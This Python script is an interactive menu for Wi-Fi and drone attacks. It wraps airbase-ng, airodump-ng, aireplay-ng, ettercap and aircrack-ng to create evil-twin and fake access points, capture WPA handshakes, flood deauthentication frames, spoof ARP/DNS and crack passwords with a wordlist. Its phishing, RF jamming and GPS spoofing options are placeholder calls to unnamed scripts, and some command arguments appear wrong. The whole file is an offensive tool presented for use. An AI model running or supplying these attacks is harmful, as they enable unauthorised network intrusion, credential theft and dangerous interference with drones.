import os
import time
import sys
import csv

# Set colors for colored banner output
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
RESET = "\033[0m"

# ASCII Banner for tool execution
def print_banner(tool_name):
    banner = f"""
    {GREEN}*******************************************************
    * {BLUE}Wi-Fi & Drone Hacking Tools - {tool_name} {GREEN}          *
    * {YELLOW}Ethical Hacking & Penetration Testing Tool          *
    *******************************************************
    """
    print(banner)

# Function for Fake AP Attack (Fixed)
def fake_ap_attack(interface):
    print(f"{YELLOW}[*] Starting Fake AP Attack on {interface}...{RESET}")
    os.system(f"sudo airbase-ng -e 'FakeDroneAP' -c 6 {interface}")
    print(f"{GREEN}[+] Fake AP for Drone Created on {interface}{RESET}")

# Evil Twin Wi-Fi Attack
def evil_twin_attack(interface, real_bssid, real_essid):
    print(f"{YELLOW}[*] Starting Evil Twin Attack mimicking real AP...{RESET}")
    os.system(f"sudo airbase-ng -e '{real_essid}' -a {real_bssid} -c 6 {interface}")
    print_banner("Evil Twin Wi-Fi Attack")
    print(f"{GREEN}[+] Fake Wi-Fi AP Created impersonating {real_essid} ({real_bssid}){RESET}")

# Capture WPA Handshake
def capture_handshake(target_mac, interface, output_file):
    print(f"{YELLOW}[*] Capturing WPA Handshake from {target_mac}...{RESET}")
    os.system(f"sudo airodump-ng --bssid {target_mac} -w {output_file} {interface}")

# Deauth attack for handshake capture
def deauth_for_handshake(target_mac, interface):
    print(f"{YELLOW}[*] Sending Deauth packets to {target_mac}...{RESET}")
    os.system(f"sudo aireplay-ng --deauth 10 -a {target_mac} {interface}")

# DNS Spoofing Attack
def dns_spoofing_attack():
    print(f"{YELLOW}[*] Starting DNS Spoofing Attack...{RESET}")
    os.system("sudo ettercap -T -q -i wlan0 -M arp:remote /// ///")
    print(f"{GREEN}[+] DNS Spoofing Active (Redirecting DNS requests){RESET}")

# Phishing Attack Placeholder
def phishing_attack():
    print(f"{YELLOW}[*] Starting Phishing Attack...{RESET}")
    os.system("sudo python3 /path/to/phishing_script.py")

# Password Cracking Function
def crack_password(capture_file, wordlist):
    print(f"{YELLOW}[*] Attempting to crack WPA password...{RESET}")
    os.system(f"sudo aircrack-ng -w {wordlist} -b {capture_file}")

# Signal Jamming Placeholder
def signal_jamming_with_rf_hardware():
    print(f"{YELLOW}[*] Starting Signal Jamming...{RESET}")
    os.system("sudo python3 /path/to/signal_jammer.py")

# GPS Spoofing Placeholder
def gps_spoofing_with_hardware():
    print(f"{YELLOW}[*] Starting GPS Spoofing Attack...{RESET}")
    os.system("sudo python3 /path/to/gps_spoofer.py")

# Wi-Fi Attack Options
def wifi_tools():
    print(f"{YELLOW}[*] Wi-Fi Attack Options:{RESET}")
    print("1. Evil Twin Attack")
    print("2. Handshake Capture")
    print("3. DNS Spoofing")
    print("4. Phishing Attack")
    print("5. Password Cracking")

# Drone Attack Options
def drone_tools():
    print(f"{YELLOW}[*] Drone Attack Options:{RESET}")
    print("1. Fake AP for Drone")
    print("2. Signal Jamming")
    print("3. GPS Spoofing")

# Main Function
def main():
    print(f"{GREEN}*******************************************************")
    print(f"* {BLUE}Wi-Fi & Drone Hacking Tools{GREEN}                    *")
    print(f"*******************************************************")

    # Ask user for category selection
    print(f"{YELLOW}[*] Choose Category:{RESET}")
    print("1. Wi-Fi Tools")
    print("2. Drone Tools")
    category_choice = input(f"{YELLOW}Enter choice: {RESET}")
    
    if category_choice == '1':  # Wi-Fi Tools Category
        wifi_tools()
        action = input(f"{YELLOW}Choose option: {RESET}")
        if action == '1':
            interface = input(f"{YELLOW}Enter interface for Evil Twin Attack: {RESET}")
            real_bssid = input(f"{YELLOW}Enter Real BSSID: {RESET}")
            real_essid = input(f"{YELLOW}Enter Real ESSID: {RESET}")
            evil_twin_attack(interface, real_bssid, real_essid)
        elif action == '2':
            target_mac = input(f"{YELLOW}Enter Target MAC Address: {RESET}")
            interface = input(f"{YELLOW}Enter interface for Handshake capture: {RESET}")
            output_file = "/home/kali/Desktop/handshake_capture"
            capture_handshake(target_mac, interface, output_file)
            deauth_for_handshake(target_mac, interface)
        elif action == '3':
            dns_spoofing_attack()
        elif action == '4':
            phishing_attack()
        elif action == '5':
            capture_file = input(f"{YELLOW}Enter the path to the captured handshake file: {RESET}")
            wordlist = input(f"{YELLOW}Enter path to wordlist (e.g., /usr/share/wordlists/rockyou.txt): {RESET}")
            crack_password(capture_file, wordlist)
        else:
            print(f"{RED}[-] Invalid option!{RESET}")

    elif category_choice == '2':  # Drone Tools Category
        drone_tools()
        action = input(f"{YELLOW}Choose option: {RESET}")
        if action == '1':
            interface = input(f"{YELLOW}Enter interface for Fake AP Attack: {RESET}")
            fake_ap_attack(interface)
        elif action == '2':
            signal_jamming_with_rf_hardware()
        elif action == '3':
            gps_spoofing_with_hardware()
        else:
            print(f"{RED}[-] Invalid option!{RESET}")

    else:
        print(f"{RED}[-] Invalid category choice!{RESET}")

if __name__ == "__main__":
    main()
